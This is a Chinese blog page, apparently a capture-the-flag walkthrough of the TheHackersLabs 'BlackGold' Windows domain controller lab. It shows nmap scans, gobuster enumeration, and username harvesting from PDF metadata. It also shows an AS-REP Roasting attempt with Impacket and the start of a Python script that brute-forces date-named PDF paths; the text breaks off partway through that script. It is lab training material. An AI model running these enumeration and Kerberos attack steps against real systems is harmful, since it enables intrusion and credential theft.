<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">TheHackersLabs - BlackGold | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="BlackGold

 https://labs.thehackerslabs.com/machine/9
 



Recon

端口扫描







访问 `HTTP` 服务，通过`IIS`搭建



目录扫描，没发现什么可疑的文件夹



页面拉到下面可以下载 `PDF` 文件



图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息



作者信息中能得到两个用户名`Da..." data-next-head=""/><meta property="og:title" content="TheHackersLabs - BlackGold | Sunset Blog" data-next-head=""/><meta property="og:description" content="BlackGold

 https://labs.thehackerslabs.com/machine/9
 



Recon

端口扫描







访问 `HTTP` 服务，通过`IIS`搭建



目录扫描，没发现什么可疑的文件夹



页面拉到下面可以下载 `PDF` 文件



图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息



作者信息中能得到两个用户名`Da..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/07/15/TheHackersLabsBlackGold" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-07-15" data-next-head=""/><meta property="article:modified_time" content="2025-07-15" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="TheHackersLabs" data-next-head=""/><meta property="article:tag" content="Windows" data-next-head=""/><meta property="article:tag" content="NTDS" data-next-head=""/><meta property="article:tag" content="exiftool" data-next-head=""/><meta property="article:tag" content="Domain" data-next-head=""/><meta property="article:tag" content="AD" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="TheHackersLabs - BlackGold" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/07/15/TheHackersLabsBlackGold" data-next-head=""/><link rel="preload" href="/_next/static/css/e6dcfa5be8702d82.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-07-15","description":"BlackGold\n\n https://labs.thehackerslabs.com/machine/9\n \n\n\n\nRecon\n\n端口扫描\n\n\n\n\n\n\n\n访问 `HTTP` 服务，通过`IIS`搭建\n\n\n\n目录扫描，没发现什么可疑的文件夹\n\n\n\n页面拉到下面可以下载 `PDF` 文件\n\n\n\n图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息\n\n\n\n作者信息中能得到两个用户名`Da...","mainEntityOfPage":{"@type":"WebPage","@id":"https://sunsetaction.top/2025/07/15/TheHackersLabsBlackGold"},"headline":"TheHackersLabs - BlackGold","image":["https://sunsetaction.top/images/logo.png"],"dateModified":"2025-07-15","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://sunsetaction.top/images/logo.png"}}}</script><link rel="stylesheet" href="/_next/static/css/e6dcfa5be8702d82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/147-e33b339acc3d8930.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-1aff2f82080a52f7.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_buildManifest.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">TheHackersLabs - BlackGold</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-07-15</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-07-15<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">TheHackersLabs</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Windows</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">NTDS</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">exiftool</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Domain</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">AD</span></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsBlackGold","contentHtml":"\u003ch1\u003eBlackGold\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/9\"\u003ehttps://labs.thehackerslabs.com/machine/9\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:30 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00030s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00031s latency).\nMAC Address: 08:00:27:B8:0A:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.10\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.5\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 28.11 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold nmap -sT -min-rate 10000 -p- 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:32 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.10\nHost is up (0.00066s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n65047/tcp open  unknown\n65051/tcp open  unknown\n65052/tcp open  unknown\n65062/tcp open  unknown\n65071/tcp open  unknown\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 26.45 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:33 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.10\nHost is up (0.00038s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title:  Neptune\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-07-14 16:33:43Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n65047/tcp open  msrpc         Microsoft Windows RPC\n65051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n65052/tcp open  msrpc         Microsoft Windows RPC\n65062/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-14T16:34:35\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: \u0026#x3C;unknown\u003e, NetBIOS MAC: 08:00:27:31:d9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -2s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.38 ms 192.168.56.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 111.63 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 服务，通过\u003ccode\u003eIIS\u003c/code\u003e搭建\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描，没发现什么可疑的文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 151] [--\u003e http://192.168.56.10/images/]\n/docs                 (Status: 301) [Size: 149] [--\u003e http://192.168.56.10/docs/]\n/Images               (Status: 301) [Size: 151] [--\u003e http://192.168.56.10/Images/]\n/css                  (Status: 301) [Size: 148] [--\u003e http://192.168.56.10/css/]\n/js                   (Status: 301) [Size: 147] [--\u003e http://192.168.56.10/js/]\n/Docs                 (Status: 301) [Size: 149] [--\u003e http://192.168.56.10/Docs/]\n/fonts                (Status: 301) [Size: 150] [--\u003e http://192.168.56.10/fonts/]\n/IMAGES               (Status: 301) [Size: 151] [--\u003e http://192.168.56.10/IMAGES/]\n/Fonts                (Status: 301) [Size: 150] [--\u003e http://192.168.56.10/Fonts/]\n/CSS                  (Status: 301) [Size: 148] [--\u003e http://192.168.56.10/CSS/]\n/JS                   (Status: 301) [Size: 147] [--\u003e http://192.168.56.10/JS/]\n/DOCS                 (Status: 301) [Size: 149] [--\u003e http://192.168.56.10/DOCS/]\nProgress: 661677 / 661680 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e页面拉到下面可以下载 \u003ccode\u003ePDF\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e图片上两个\u003ccode\u003ePDF\u003c/code\u003e内容都都是无用的，我们检查一下\u003ccode\u003ePDF\u003c/code\u003e元信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold pdfinfo 2024-02-15.pdf \nTitle:           Certificado de Cumplimiento de Normativas Ambientales\nSubject:         \nKeywords:        \nAuthor:          James Clear\nCreator:         Neptune Oil \u0026#x26; Gas\nProducer:        pdf-lib (https://github.com/Hopding/pdf-lib)\nCreationDate:    Thu Feb 15 11:00:00 2024 CST\nModDate:         \nCustom Metadata: no\nMetadata Stream: no\nTagged:          \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           2\nEncrypted:       no\nPage size:       596 x 842 pts (A4)\nPage rot:        0\nFile size:       58258 bytes\nOptimized:       no\nPDF version:     1.7\n\n➜  BlackGold pdfinfo 2024-11-29.pdf \nTitle:           Informe de Sostenibilidad 2024\nSubject:         Informe sobre sostenibilidad y reducción de emisiones de CO2\nKeywords:        \nAuthor:          David Brown\nCreator:         Neptune Oil \u0026#x26; Gas\nProducer:        ReportLab PDF Library - www.reportlab.com\nCreationDate:    Thu Feb 27 06:07:22 2025 CST\nModDate:         Thu Feb 27 06:07:22 2025 CST\nCustom Metadata: no\nMetadata Stream: no\nTagged:          no\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           1\nEncrypted:       no\nPage size:       612 x 792 pts (letter)\nPage rot:        0\nFile size:       2110 bytes\nOptimized:       no\nPDF version:     1.5\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e作者信息中能得到两个用户名\u003ccode\u003eDavid.Brown\u003c/code\u003e 和 \u003ccode\u003eJames.Clear\u003c/code\u003e ，可能是域用户\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003eAS_REP Roasting ❌\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e得到两个用户名，首先尝试一下 ****\u003ccode\u003eAS_REP Roasting\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold GetNPUsers.py -dc-ip 192.168.56.10 -dc-host neptune.thl nwptune.htl/ -usersfile users.txt\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e future use)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e future use)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e路径爆破\u003c/h2\u003e\n\u003cp\u003e观察到下载\u003ccode\u003ePDF\u003c/code\u003e的路径是：\u003ccode\u003ehttp://192.168.56.10/docs/2024-11-29.pdf\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e是根据日期命名，我们尝试一下通过日期爆破一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后能爆破到\u003ccode\u003e192\u003c/code\u003e个\u003ccode\u003ePDF\u003c/code\u003e文档\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里使用\u003ccode\u003eyakit\u003c/code\u003e无法导出文件，所以还是需要写\u003ccode\u003epython\u003c/code\u003e脚本来爆破…\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\nimport datetime\nimport os\n\n\u003cspan class=\"hljs-comment\"\u003e# --- 配置 ---\u003c/span\u003e\nHOST = \u003cspan class=\"hljs-string\"\u003e\"192.168.56.10\"\u003c/span\u003e\nPORT = 80  \u003cspan class=\"hljs-comment\"\u003e# 根据需要修改 HTTP 端口\u003c/span\u003e\nBASE_URL = f\u003cspan class=\"hljs-string\"\u003e\"http://{HOST}:{PORT}\"\u003c/span\u003e\n\nSTART_YEAR = 2023\nEND_YEAR = 2024  \u003cspan class=\"hljs-comment\"\u003e# 实际会检查到 2025 年\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 保存下载文件的目录名\u003c/span\u003e\nOUTPUT_DIR = \u003cspan class=\"hljs-string\"\u003e\"found_pdfs\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# --- 主逻辑 ---\u003c/span\u003e\ndef fuzz_and_download():\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    遍历指定日期范围，尝试下载 PDF 文件。\n    如果服务器返回 200 状态码，则将文件保存到本地。\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] 开始爆破目标: {BASE_URL}\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] 找到的 PDF 将保存在 ./{OUTPUT_DIR}/ 目录中\"\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 1. 如果输出目录不存在，则创建它\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e not os.path.exists(OUTPUT_DIR):\n        os.makedirs(OUTPUT_DIR)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] 已创建目录: {OUTPUT_DIR}\"\u003c/span\u003e)\n\n    found_files_count = 0\n\n    \u003cspan class=\"hljs-comment\"\u003e# 2. 遍历所有可能的日期\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e year \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(START_YEAR, END_YEAR + 1):\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e month \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(1, 13):\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e day \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(1, 32):\n                \n                \u003cspan class=\"hljs-comment\"\u003e# 验证日期是否有效，跳过如 2月30日 等\u003c/span\u003e\n                try:\n                    datetime.date(year, month, day)\n                except ValueError:\n                    \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n\n                \u003cspan class=\"hljs-comment\"\u003e# 格式化日期和 URL\u003c/span\u003e\n                date_str 